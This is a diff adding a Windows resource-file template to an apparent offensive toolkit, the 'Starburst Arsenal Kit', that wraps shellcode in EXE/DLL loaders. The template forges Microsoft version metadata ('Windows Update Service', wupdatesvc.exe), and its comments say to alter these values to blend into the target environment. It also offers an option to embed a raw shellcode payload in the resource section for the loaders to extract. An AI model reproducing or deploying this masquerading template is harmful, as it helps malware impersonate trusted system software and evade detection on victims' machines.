@@ -1,0 +1,129 @@
+/*
+ * Starburst Arsenal Kit - Resource File Template
+ *
+ * Provides version info, icon, and manifest for EXE/DLL wrappers.
+ * Customize the values below to match the target environment.
+ *
+ * Build (MinGW):
+ *   x86_64-w64-mingw32-windres templates/resource.rc -o resource.o
+ *   ... then link resource.o alongside the main wrapper
+ *
+ * Build (MSVC):
+ *   rc /fo resource.res templates/resource.rc
+ *   ... then link resource.res alongside the main wrapper
+ */
+
+#include <winver.h>
+
+/* ====================================================================
+ * Customizable metadata -- change these to blend with the target env
+ * ==================================================================== */
+
+#define VER_FILEVERSION             1,0,0,0
+#define VER_FILEVERSION_STR         "1.0.0.0"
+#define VER_PRODUCTVERSION          1,0,0,0
+#define VER_PRODUCTVERSION_STR      "1.0.0.0"
+
+#define VER_COMPANYNAME_STR         "Microsoft Corporation"
+#define VER_FILEDESCRIPTION_STR     "Windows Update Service"
+#define VER_INTERNALNAME_STR        "wupdatesvc"
+#define VER_LEGALCOPYRIGHT_STR      "Copyright (C) Microsoft Corporation. All rights reserved."
+#define VER_ORIGINALFILENAME_STR    "wupdatesvc.exe"
+#define VER_PRODUCTNAME_STR         "Microsoft Windows Operating System"
+
+/* Set to VFT_APP for EXE, VFT_DLL for DLL */
+#define VER_FILETYPE                VFT_APP
+
+/* ====================================================================
+ * Icon resource
+ *
+ * Replace the path with your own .ico file, or comment out to omit.
+ * ==================================================================== */
+/* IDI_ICON1 ICON "assets\\app.ico" */
+
+/* ====================================================================
+ * Shellcode as embedded resource (optional)
+ *
+ * Uncomment to embed raw shellcode in the .rsrc section.
+ * The main_*.c wrappers load it via FindResource(IDR_SHELLCODE).
+ * ==================================================================== */
+/* #define IDR_SHELLCODE 101 */
+/* IDR_SHELLCODE RCDATA "payload.bin" */
+
+/* ====================================================================
+ * Version information block
+ * ==================================================================== */
+VS_VERSION_INFO VERSIONINFO
+    FILEVERSION     VER_FILEVERSION
+    PRODUCTVERSION  VER_PRODUCTVERSION
+    FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
+    FILEFLAGS       0
+    FILEOS          VOS_NT_WINDOWS32
+    FILETYPE        VER_FILETYPE
+    FILESUBTYPE     VFT2_UNKNOWN
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904B0"   /* US English, Unicode */
+        BEGIN
+            VALUE "CompanyName",      VER_COMPANYNAME_STR
+            VALUE "FileDescription",  VER_FILEDESCRIPTION_STR
+            VALUE "FileVersion",      VER_FILEVERSION_STR
+            VALUE "InternalName",     VER_INTERNALNAME_STR
+            VALUE "LegalCopyright",   VER_LEGALCOPYRIGHT_STR
+            VALUE "OriginalFilename", VER_ORIGINALFILENAME_STR
+            VALUE "ProductName",      VER_PRODUCTNAME_STR
+            VALUE "ProductVersion",   VER_PRODUCTVERSION_STR
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x0409, 0x04B0   /* US English, Unicode */
+    END
+END
+
+/* ====================================================================
+ * Application manifest
+ *
+ * - DPI awareness: enabled (per-monitor v2)
+ * - UAC: asInvoker (no elevation prompt)
+ *   Change to "highestAvailable" or "requireAdministrator" as needed.
+ * - Common controls v6
+ * ==================================================================== */
+1 RT_MANIFEST
+BEGIN
+    "<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>\r\n"
+    "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">\r\n"
+    "  <assemblyIdentity\r\n"
+    "      type=""win32""\r\n"
+    "      name=""Starburst.Wrapper""\r\n"
+    "      version=""1.0.0.0""\r\n"
+    "      processorArchitecture=""amd64""\r\n"
+    "  />\r\n"
+    "  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v3"">\r\n"
+    "    <security>\r\n"
+    "      <requestedPrivileges>\r\n"
+    "        <requestedExecutionLevel level=""asInvoker"" uiAccess=""false"" />\r\n"
+    "      </requestedPrivileges>\r\n"
+    "    </security>\r\n"
+    "  </trustInfo>\r\n"
+    "  <application xmlns=""urn:schemas-microsoft-com:asm.v3"">\r\n"
+    "    <windowsSettings>\r\n"
+    "      <dpiAwareness xmlns=""http://schemas.microsoft.com/SMI/2016/WindowsSettings"">PerMonitorV2</dpiAwareness>\r\n"
+    "      <dpiAware xmlns=""http://schemas.microsoft.com/SMI/2005/WindowsSettings"">true/pm</dpiAware>\r\n"
+    "    </windowsSettings>\r\n"
+    "  </application>\r\n"
+    "  <dependency>\r\n"
+    "    <dependentAssembly>\r\n"
+    "      <assemblyIdentity\r\n"
+    "          type=""win32""\r\n"
+    "          name=""Microsoft.Windows.Common-Controls""\r\n"
+    "          version=""6.0.0.0""\r\n"
+    "          processorArchitecture=""amd64""\r\n"
+    "          publicKeyToken=""6595b64144ccf1df""\r\n"
+    "          language=""*""\r\n"
+    "      />\r\n"
+    "    </dependentAssembly>\r\n"
+    "  </dependency>\r\n"
+    "</assembly>\r\n"
+END
